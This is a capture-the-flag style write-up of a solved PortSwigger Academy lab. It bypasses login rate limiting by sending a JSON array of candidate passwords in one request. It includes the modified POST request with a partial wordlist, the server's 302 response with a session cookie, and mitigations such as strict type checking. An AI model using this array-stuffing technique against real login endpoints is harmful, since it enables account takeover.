📝 Lab: Broken Brute-Force Protection, Multiple Credentials per Request
Platform: PortSwigger Web Security Academy

Difficulty: Expert 🧠

Status: ✅ Solved (Unassisted)

Topic: Authentication

Tags: #authentication #brute-force #rate-limit-bypass #json-array #type-juggling

🎯 Objective
Brute-force carlos's password and access his account page by bypassing the server's rate-limiting protections.

🧠 Vulnerability Analysis (The Logic Flaw)
The application uses JSON to transmit login credentials (e.g., {"username":"carlos", "password":"123"}). The vulnerability lies in a critical disconnect between the application's rate limiter and its backend authentication logic.

The Theory:

The Rate Limiter: The server protects against brute-forcing by tracking the number of HTTP requests coming from an IP address. If you send too many requests, you get blocked.

The Backend Logic: When the backend receives the JSON payload, it expects the password field to be a single String. However, JSON is incredibly flexible. If an attacker changes that String into an Array of strings (e.g., ["pass1", "pass2", "pass3"]), a poorly configured backend won't throw a type error. Instead, the backend framework's underlying logic iterates through the array, testing every single password against the database.

The Bypass: By stuffing hundreds of passwords into a single JSON array, we only send one HTTP request. The rate limiter sees "1 request" and allows it through, while the backend silently processes hundreds of login attempts simultaneously.

🚀 Exploitation Steps
Step 1: Capture the Baseline Request
Navigated to /login and attempted a normal login using carlos:1234.

Intercepted the POST /login request in Burp Suite and sent it to Repeater.

Observed the body of the request was formatted as JSON:

JSON
{"username":"carlos","password":"1234"}
Step 2: Payload Preparation
I needed to convert the provided candidate password list into a valid JSON array.

Copied the entire list of passwords.

Used an online tool (like ytool.net/list2json/) to quickly format the raw text into a comma-separated JSON array.

Step 3: The Exploit (Array Injection)
In my Repeater tab, I modified the intercepted request. I replaced the single string password with the massive JSON array containing all candidate passwords.

Modified Payload:

HTTP
POST /login HTTP/2
Host: 0a2900b604b04f5e82251f2e001d0015.web-security-academy.net
Content-Type: application/json
...

{"username":"carlos","password":[
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    ... // Entire wordlist pasted here
]}
Step 4: Session Hijack & Verification
I sent the single request. Because one of the passwords in the array was correct, the backend authenticated the request and responded with a 302 Found.

The Server Response:

HTTP
HTTP/2 302 Found
Location: /my-account?id=carlos
Set-Cookie: session=15C12pRkEigf2L1MelNOYMi6ju81zeKY; Secure; HttpOnly; SameSite=None
The server successfully verified the password and handed me a valid session cookie for carlos!
<img width="1532" height="743" alt="image" src="https://github.com/user-attachments/assets/23cb42da-33af-4453-8097-8fde7f94aaa8" />

Step 5: Accessing the Account
To complete the lab, I grabbed the new session cookie (15C12pRkEigf2L1MelNOYMi6ju81zeKY), went to a new Repeater tab, and sent a GET /my-account?id=carlos request with the injected cookie. The server accepted the session, granting me access to the account.
<img width="1531" height="716" alt="image" src="https://github.com/user-attachments/assets/f9b423e0-64d1-4181-8b13-81360c75bb07" />

💡 Root Cause & Mitigations
The Root Cause
The vulnerability exists because of missing type validation on the backend. The backend blindly accepted an Array data type where a String data type was expected, and then "helpfully" processed the array natively. This created a loophole that rendered the HTTP request-based rate limiter completely useless.

Developer Mitigations
Strict Type Checking: The backend must explicitly validate the data type of incoming JSON fields. If password is anything other than a String, the server should immediately drop the request and return a 400 Bad Request.

Rate Limit at the Application Layer: Do not just count HTTP requests. If batch processing is intentionally allowed by the API, the rate limiter must count the number of operations (e.g., the length of the array) being requested, not just the network packets.
